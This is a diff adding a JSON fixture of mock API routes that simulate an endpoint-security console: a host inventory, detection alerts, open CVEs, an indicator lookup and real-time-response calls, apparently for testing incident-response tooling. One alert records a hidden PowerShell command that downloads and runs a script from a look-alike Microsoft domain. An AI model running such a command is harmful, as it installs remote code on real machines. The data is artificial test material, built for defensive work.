@@ -1,0 +1,471 @@
+{
+ "routes": [
+  {
+   "method": "GET",
+   "path": "^/devices/queries/devices/v1$",
+   "body": {
+    "resources": [
+     "cs-aid-jane01"
+    ],
+    "meta": {}
+   },
+   "status": 200,
+   "params": {
+    "filter": "hostname:'JANE-LT01'"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/devices/queries/devices/v1$",
+   "body": {
+    "resources": [
+     "cs-aid-bob02"
+    ],
+    "meta": {}
+   },
+   "status": 200,
+   "params": {
+    "filter": "hostname:'BOB-LT02'"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/devices/queries/devices/v1$",
+   "body": {
+    "resources": [],
+    "meta": {}
+   },
+   "status": 200,
+   "params": {
+    "filter": "*"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/devices/queries/devices/v1$",
+   "body": {
+    "resources": [
+     "cs-aid-jane01",
+     "cs-aid-bob02",
+     "cs-aid-web01",
+     "cs-aid-fs01"
+    ],
+    "meta": {
+     "pagination": {
+      "offset": 0,
+      "limit": 100,
+      "total": 4
+     }
+    }
+   },
+   "status": 200
+  },
+  {
+   "method": "POST",
+   "path": "^/devices/entities/devices/v2$",
+   "body": {
+    "resources": [
+     {
+      "device_id": "cs-aid-jane01",
+      "hostname": "JANE-LT01",
+      "local_ip": "10.20.1.15",
+      "external_ip": "203.0.113.10",
+      "mac_address": "00-1A-2B-3C-4D-5E",
+      "serial_number": "5CG1234XYZ",
+      "os_version": "Windows 11 Enterprise",
+      "platform_name": "Windows",
+      "agent_version": "7.18.18209.0",
+      "status": "normal",
+      "last_seen": "2026-09-20T10:00:00Z",
+      "tags": [
+       "FalconGroupingTags/Finance"
+      ]
+     },
+     {
+      "device_id": "cs-aid-bob02",
+      "hostname": "BOB-LT02",
+      "local_ip": "10.20.1.22",
+      "external_ip": "203.0.113.10",
+      "mac_address": "00-1A-2B-3C-4D-6F",
+      "serial_number": "5CG5678ABC",
+      "os_version": "Windows 11 Enterprise",
+      "platform_name": "Windows",
+      "agent_version": "7.18.18209.0",
+      "status": "normal",
+      "last_seen": "2026-09-20T10:00:00Z",
+      "tags": []
+     },
+     {
+      "device_id": "cs-aid-web01",
+      "hostname": "web01",
+      "local_ip": "10.10.0.5",
+      "external_ip": "203.0.113.10",
+      "mac_address": null,
+      "serial_number": "VMware-42 1a 7c 3e",
+      "os_version": "Ubuntu 22.04 LTS",
+      "platform_name": "Linux",
+      "agent_version": "7.18.18209.0",
+      "status": "normal",
+      "last_seen": "2026-09-20T10:00:00Z",
+      "tags": []
+     },
+     {
+      "device_id": "cs-aid-fs01",
+      "hostname": "FS01",
+      "local_ip": "10.10.0.20",
+      "external_ip": "203.0.113.10",
+      "mac_address": null,
+      "serial_number": "CZ20240001",
+      "os_version": "Windows Server 2022",
+      "platform_name": "Windows",
+      "agent_version": "7.18.18209.0",
+      "status": "normal",
+      "last_seen": "2026-09-20T10:00:00Z",
+      "tags": []
+     }
+    ]
+   },
+   "status": 200,
+   "select": {
+    "from": "json.ids",
+    "list": "resources",
+    "key": "device_id"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/alerts/queries/alerts/v2$",
+   "body": {
+    "resources": [
+     "cci:ind:cs-aid-jane01:0001"
+    ]
+   },
+   "status": 200,
+   "params": {
+    "filter": "device.device_id:'cs-aid-jane01'"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/alerts/queries/alerts/v2$",
+   "body": {
+    "resources": [
+     "cci:ind:cs-aid-jane01:0001"
+    ]
+   },
+   "status": 200,
+   "params": {
+    "filter": "user_name:'jane.doe'"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/alerts/queries/alerts/v2$",
+   "body": {
+    "resources": []
+   },
+   "status": 200,
+   "params": {
+    "filter": "*"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/alerts/queries/alerts/v2$",
+   "body": {
+    "resources": [
+     "cci:ind:cs-aid-jane01:0001",
+     "cci:ind:cs-aid-web01:0002"
+    ],
+    "meta": {
+     "pagination": {
+      "offset": 0,
+      "total": 2
+     }
+    }
+   },
+   "status": 200
+  },
+  {
+   "method": "POST",
+   "path": "^/alerts/entities/alerts/v2$",
+   "body": {
+    "resources": [
+     {
+      "composite_id": "cci:ind:cs-aid-jane01:0001",
+      "created_timestamp": "2026-09-20T09:09:12Z",
+      "severity": 85,
+      "display_name": "PowerShell downloaded and executed a remote payload",
+      "name": "PowerShellRemotePayload",
+      "description": "A PowerShell process spawned by the browser downloaded and executed a script from an external domain.",
+      "tactic": "Execution",
+      "technique": "PowerShell",
+      "technique_id": "T1059.001",
+      "confidence": 90,
+      "device": {
+       "device_id": "cs-aid-jane01",
+       "hostname": "JANE-LT01",
+       "local_ip": "10.20.1.15",
+       "os_version": "Windows 11 Enterprise",
+       "platform_name": "Windows"
+      },
+      "user_name": "CCI\\jane.doe",
+      "filename": "invoice_viewer.ps1",
+      "sha256": "a3f5c0e1b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6",
+      "cmdline": "powershell.exe -nop -w hidden -c iex(iwr https://login.micros0ft-helpdesk.com/p.ps1)",
+      "parent_details": {
+       "cmdline": "msedge.exe --single-argument https://login.micros0ft-helpdesk.com/verify"
+      },
+      "status": "new",
+      "falcon_host_link": "https://falcon.crowdstrike.com/activity-v2/detections/cs-aid-jane01:0001"
+     },
+     {
+      "composite_id": "cci:ind:cs-aid-web01:0002",
+      "created_timestamp": "2026-09-20T07:40:00Z",
+      "severity": 30,
+      "display_name": "Unusual outbound connection from web server",
+      "name": "UnusualOutbound",
+      "description": "Low-confidence network anomaly.",
+      "tactic": "Command and Control",
+      "technique": "Application Layer Protocol",
+      "technique_id": "T1071",
+      "confidence": 30,
+      "device": {
+       "device_id": "cs-aid-web01",
+       "hostname": "web01",
+       "local_ip": "10.10.0.5",
+       "os_version": "Ubuntu 22.04 LTS",
+       "platform_name": "Linux"
+      },
+      "user_name": "www-data",
+      "status": "new",
+      "falcon_host_link": "https://falcon.crowdstrike.com/activity-v2/detections/cs-aid-web01:0002"
+     }
+    ]
+   },
+   "status": 200,
+   "select": {
+    "from": "json.composite_ids",
+    "list": "resources",
+    "key": "composite_id"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/spotlight/combined/vulnerabilities/v1$",
+   "body": {
+    "resources": [],
+    "meta": {
+     "pagination": {}
+    }
+   },
+   "status": 200,
+   "params": {
+    "after": "*"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/spotlight/combined/vulnerabilities/v1$",
+   "body": {
+    "resources": [
+     {
+      "id": "cs-aid-web01_CVE-2021-44228",
+      "aid": "cs-aid-web01",
+      "status": "open",
+      "created_timestamp": "2026-09-01T00:00:00Z",
+      "updated_timestamp": "2026-09-20T06:00:00Z",
+      "cve": {
+       "id": "CVE-2021-44228",
+       "base_score": 10.0,
+       "severity": "CRITICAL",
+       "exploit_status": 90,
+       "exprt_rating": "CRITICAL"
+      },
+      "host_info": {
+       "hostname": "web01",
+       "local_ip": "10.10.0.5",
+       "os_version": "Ubuntu 22.04 LTS"
+      },
+      "apps": [
+       {
+        "product_name_version": "Apache Log4j 2.14.1"
+       }
+      ],
+      "remediation": {
+       "entities": [
+        {
+         "action": "Update Apache to the latest version"
+        }
+       ]
+      }
+     },
+     {
+      "id": "cs-aid-web01_CVE-2023-44487",
+      "aid": "cs-aid-web01",
+      "status": "open",
+      "created_timestamp": "2026-09-01T00:00:00Z",
+      "updated_timestamp": "2026-09-20T06:00:00Z",
+      "cve": {
+       "id": "CVE-2023-44487",
+       "base_score": 7.5,
+       "severity": "HIGH",
+       "exploit_status": 90,
+       "exprt_rating": "CRITICAL"
+      },
+      "host_info": {
+       "hostname": "web01",
+       "local_ip": "10.10.0.5",
+       "os_version": "Ubuntu 22.04 LTS"
+      },
+      "apps": [
+       {
+        "product_name_version": "nginx 1.18.0"
+       }
+      ],
+      "remediation": {
+       "entities": [
+        {
+         "action": "Update nginx to the latest version"
+        }
+       ]
+      }
+     },
+     {
+      "id": "cs-aid-jane01_CVE-2024-21412",
+      "aid": "cs-aid-jane01",
+      "status": "open",
+      "created_timestamp": "2026-09-01T00:00:00Z",
+      "updated_timestamp": "2026-09-20T06:00:00Z",
+      "cve": {
+       "id": "CVE-2024-21412",
+       "base_score": 8.1,
+       "severity": "HIGH",
+       "exploit_status": 90,
+       "exprt_rating": "CRITICAL"
+      },
+      "host_info": {
+       "hostname": "JANE-LT01",
+       "local_ip": "10.20.1.15",
+       "os_version": "Windows 11 Enterprise"
+      },
+      "apps": [
+       {
+        "product_name_version": "Microsoft Windows 11"
+       }
+      ],
+      "remediation": {
+       "entities": [
+        {
+         "action": "Update Microsoft to the latest version"
+        }
+       ]
+      }
+     },
+     {
+      "id": "cs-aid-bob02_CVE-2024-21412",
+      "aid": "cs-aid-bob02",
+      "status": "open",
+      "created_timestamp": "2026-09-01T00:00:00Z",
+      "updated_timestamp": "2026-09-20T06:00:00Z",
+      "cve": {
+       "id": "CVE-2024-21412",
+       "base_score": 8.1,
+       "severity": "HIGH",
+       "exploit_status": 90,
+       "exprt_rating": "CRITICAL"
+      },
+      "host_info": {
+       "hostname": "BOB-LT02",
+       "local_ip": "10.20.1.22",
+       "os_version": "Windows 11 Enterprise"
+      },
+      "apps": [
+       {
+        "product_name_version": "Microsoft Windows 11"
+       }
+      ],
+      "remediation": {
+       "entities": [
+        {
+         "action": "Update Microsoft to the latest version"
+        }
+       ]
+      }
+     }
+    ],
+    "meta": {
+     "pagination": {
+      "after": "page-2",
+      "total": 4
+     }
+    }
+   },
+   "status": 200
+  },
+  {
+   "method": "GET",
+   "path": "^/iocs/combined/indicator/v1$",
+   "body": {
+    "resources": [
+     {
+      "type": "domain",
+      "value": "micros0ft-helpdesk.com",
+      "action": "detect",
+      "severity": "high"
+     }
+    ]
+   },
+   "status": 200,
+   "params": {
+    "filter": "type:'domain'+value:'micros0ft-helpdesk.com'"
+   }
+  },
+  {
+   "method": "GET",
+   "path": "^/iocs/combined/indicator/v1$",
+   "body": {
+    "resources": []
+   },
+   "status": 200
+  },
+  {
+   "method": "POST",
+   "path": "^/real-time-response/entities/sessions/v1$",
+   "body": {
+    "resources": [
+     {
+      "session_id": "rtr-sess-001"
+     }
+    ]
+   },
+   "status": 200
+  },
+  {
+   "method": "POST",
+   "path": "^/real-time-response/entities/command/v1$",
+   "body": {
+    "resources": [
+     {
+      "stdout": "PID  NAME\n4120 powershell.exe\n5528 msedge.exe",
+      "complete": true
+     }
+    ]
+   },
+   "status": 200
+  },
+  {
+   "method": "POST",
+   "path": "^/devices/entities/devices-actions/v2$",
+   "body": {
+    "resources": [
+     {
+      "id": "ok"
+     }
+    ],
+    "errors": []
+   },
+   "status": 200
+  }
+ ]
+}
